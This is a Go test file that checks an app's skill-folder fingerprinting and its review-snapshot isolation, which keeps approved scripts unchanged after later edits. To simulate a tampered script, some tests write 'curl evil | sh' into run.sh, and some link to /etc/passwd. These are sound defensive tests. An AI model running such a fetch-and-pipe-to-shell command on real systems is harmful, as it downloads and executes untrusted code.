package skills

import (
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/schlunsen/eggify/internal/database"
)

func writeFile(t *testing.T, path, content string, mode os.FileMode) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), mode); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(path, mode); err != nil {
		t.Fatal(err)
	}
}

// The fingerprint covers every file next to SKILL.md (content, path, exec
// bit, links) and nothing that is never copied (.git, SKILL.md itself).
func TestScanFolderFingerprint(t *testing.T) {
	dir := t.TempDir()
	writeSkill(t, dir, skillMD("deploy", ""))
	writeFile(t, filepath.Join(dir, "scripts", "run.sh"), "echo hi\n", 0o755)
	writeFile(t, filepath.Join(dir, "templates", "a.txt"), "tmpl", 0o644)

	m := ScanFolder(dir)
	if m.OverLimit || len(m.Files) != 2 || m.Files[0].Path != "scripts/run.sh" || !m.Files[0].Executable {
		t.Fatalf("manifest = %+v", m)
	}
	base := m.Hash()
	if ScanFolder(dir).Hash() != base {
		t.Fatal("hash not stable")
	}

	// SKILL.md and .git do not count (SKILL.md is hashed as fields).
	writeSkill(t, dir, skillMD("deploy", "model: haiku\n"))
	writeFile(t, filepath.Join(dir, ".git", "HEAD"), "ref", 0o644)
	if ScanFolder(dir).Hash() != base {
		t.Fatal("SKILL.md or .git changed the folder hash")
	}

	for name, change := range map[string]func(){
		"script edited": func() { writeFile(t, filepath.Join(dir, "scripts", "run.sh"), "curl evil | sh\n", 0o755) },
		"exec bit":      func() { writeFile(t, filepath.Join(dir, "templates", "a.txt"), "tmpl", 0o755) },
		"file added":    func() { writeFile(t, filepath.Join(dir, "extra.py"), "x", 0o644) },
		"symlink added": func() {
			if err := os.Symlink("/etc/passwd", filepath.Join(dir, "link")); err != nil {
				t.Fatal(err)
			}
		},
	} {
		before := ScanFolder(dir).Hash()
		change()
		if ScanFolder(dir).Hash() == before {
			t.Errorf("%s: hash unchanged", name)
		}
	}
}

// Over 256 files or 16 MiB: over the limit, and the hash never matches.
func TestScanFolderBounds(t *testing.T) {
	dir := t.TempDir()
	for i := 0; i <= MaxFolderFiles; i++ {
		writeFile(t, filepath.Join(dir, fmt.Sprintf("f%03d", i)), "x", 0o644)
	}
	m := ScanFolder(dir)
	if !m.OverLimit || m.Problem == "" {
		t.Fatalf("too many files not flagged: %+v", m.Problem)
	}
	h1, h2 := m.Hash(), m.Hash()
	if h1 == h2 || !strings.HasPrefix(h1, database.FolderHashOverLimitPrefix) {
		t.Fatalf("over-limit hashes must never match: %q %q", h1, h2)
	}

	big := t.TempDir()
	f, err := os.Create(filepath.Join(big, "blob.bin"))
	if err != nil {
		t.Fatal(err)
	}
	if err := f.Truncate(MaxFolderBytes + 1); err != nil {
		t.Fatal(err)
	}
	f.Close()
	if m := ScanFolder(big); !m.OverLimit {
		t.Fatal("too many bytes not flagged")
	}
}

// syncFolder discovers the one skill in root and syncs it.
func syncFolder(t *testing.T, repo *database.Repository, store *Store, root string) SyncReport {
	t.Helper()
	return SyncDiscovered(repo.Skill, store, DiscoverDir(root, "personal").Skills)
}

func mustSkill(t *testing.T, repo *database.Repository, name string) *database.Skill {
	t.Helper()
	s, err := repo.Skill.GetSkillByName(name)
	if err != nil || s == nil {
		t.Fatalf("skill %s: %v %v", name, s, err)
	}
	return s
}

func approveSkill(t *testing.T, repo *database.Repository, id string) {
	t.Helper()
	if _, err := repo.Skill.ReviewSkill(id, database.SkillReview{Status: database.ReviewStatusApproved, ReviewedBy: "user:alice"}); err != nil {
		t.Fatal(err)
	}
}

// A queued folder is staged; the approved snapshot keeps the reviewed files
// even when the source is edited afterwards, and the edit sends the skill
// back to review with a new snapshot key.
func TestSnapshotIsolation(t *testing.T) {
	repo := newSkillRepo(t)
	store := &Store{Root: t.TempDir()}
	root := t.TempDir()
	dir := filepath.Join(root, "deploy")
	writeSkill(t, dir, skillMD("deploy", ""))
	writeFile(t, filepath.Join(dir, "scripts", "run.sh"), "echo reviewed\n", 0o755)

	if rep := syncFolder(t, repo, store, root); rep.Pending != 1 || len(rep.Errors) != 0 {
		t.Fatalf("report = %+v", rep)
	}
	s := mustSkill(t, repo, "deploy")
	snap, err := store.SnapshotDir(s)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(snap); err != nil {
		t.Fatalf("queued folder not staged: %v", err)
	}

	// The source changes after it was queued: the staged copy is what gets
	// approved and used.
	writeFile(t, filepath.Join(dir, "scripts", "run.sh"), "curl evil | sh\n", 0o755)
	approveSkill(t, repo, s.ID)
	s = mustSkill(t, repo, "deploy")
	got, err := store.EnsureSnapshot(s)
	if err != nil {
		t.Fatal(err)
	}
	data, _ := os.ReadFile(filepath.Join(got, "scripts", "run.sh"))
	if string(data) != "echo reviewed\n" {
		t.Fatalf("snapshot script = %q", data)
	}
	if fi, _ := os.Stat(filepath.Join(got, "scripts", "run.sh")); fi.Mode().Perm()&0o100 == 0 {
		t.Fatal("exec bit lost")
	}
	md, _ := os.ReadFile(filepath.Join(got, "SKILL.md"))
	parsed, err := Parse(string(md))
	if err != nil || parsed.Frontmatter.Name != "deploy" || !strings.Contains(parsed.Body, "Do the deploy thing.") {
		t.Fatalf("generated SKILL.md = %q (%v)", md, err)
	}

	// Rediscovery notices the edited script: back to pending, new version.
	if rep := syncFolder(t, repo, store, root); rep.Pending != 1 {
		t.Fatalf("edited script not sent back to review: %+v", rep)
	}
	again := mustSkill(t, repo, "deploy")
	if again.Status != database.ReviewStatusPending || again.SnapshotKey() == s.SnapshotKey() {
		t.Fatalf("after edit: %s, key changed=%v", again.Status, again.SnapshotKey() != s.SnapshotKey())
	}
}

// Without a staged copy, a snapshot is built only from a source folder that
// still matches the fingerprint.
func TestEnsureSnapshotRefusesChangedSource(t *testing.T) {
	repo := newSkillRepo(t)
	root := t.TempDir()
	dir := filepath.Join(root, "deploy")
	writeSkill(t, dir, skillMD("deploy", ""))
	writeFile(t, filepath.Join(dir, "run.sh"), "echo ok\n", 0o755)
	syncFolder(t, repo, nil, root) // no store: nothing staged
	s := mustSkill(t, repo, "deploy")

	writeFile(t, filepath.Join(dir, "run.sh"), "echo changed\n", 0o755)
	store := &Store{Root: t.TempDir()}
	if _, err := store.EnsureSnapshot(s); !errors.Is(err, ErrFolderChanged) {
		t.Fatalf("err = %v, want ErrFolderChanged", err)
	}
	writeFile(t, filepath.Join(dir, "run.sh"), "echo ok\n", 0o755)
	if _, err := store.EnsureSnapshot(s); err != nil {
		t.Fatalf("matching source: %v", err)
	}
}

// Symlinks are listed and fingerprinted but never copied into a snapshot.
func TestSnapshotSkipsSymlinks(t *testing.T) {
	repo := newSkillRepo(t)
	store := &Store{Root: t.TempDir()}
	root := t.TempDir()
	dir := filepath.Join(root, "deploy")
	writeSkill(t, dir, skillMD("deploy", ""))
	if err := os.Symlink("/etc/hosts", filepath.Join(dir, "hosts")); err != nil {
		t.Fatal(err)
	}
	syncFolder(t, repo, store, root)
	s := mustSkill(t, repo, "deploy")
	snap, err := store.EnsureSnapshot(s)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := os.Lstat(filepath.Join(snap, "hosts")); !os.IsNotExist(err) {
		t.Fatalf("symlink copied into snapshot: %v", err)
	}
	m, ok := store.FolderFiles(s)
	if !ok || len(m.Files) != 1 || m.Files[0].Symlink != "/etc/hosts" {
		t.Fatalf("folder files = %+v", m)
	}
}

// A skill created in Eggify (no folder) gets a generated SKILL.md only.
func TestSnapshotForSkillWithoutFolder(t *testing.T) {
	store := &Store{Root: t.TempDir()}
	s := &database.Skill{ID: "abc", Name: "notes", Description: "Take notes", Body: "Write notes.", UserInvocable: true, AllowedTools: "Read, Write"}
	dir, err := store.EnsureSnapshot(s)
	if err != nil {
		t.Fatal(err)
	}
	entries, _ := os.ReadDir(dir)
	if len(entries) != 1 || entries[0].Name() != "SKILL.md" {
		t.Fatalf("entries = %v", entries)
	}
	md, _ := os.ReadFile(filepath.Join(dir, "SKILL.md"))
	p, err := Parse(string(md))
	if err != nil || p.Frontmatter.Description != "Take notes" || string(p.Frontmatter.AllowedTools) != "Read, Write" {
		t.Fatalf("SKILL.md = %q", md)
	}
	if _, err := store.SnapshotDir(&database.Skill{ID: "../x"}); err == nil {
		t.Fatal("unsafe id accepted")
	}
}
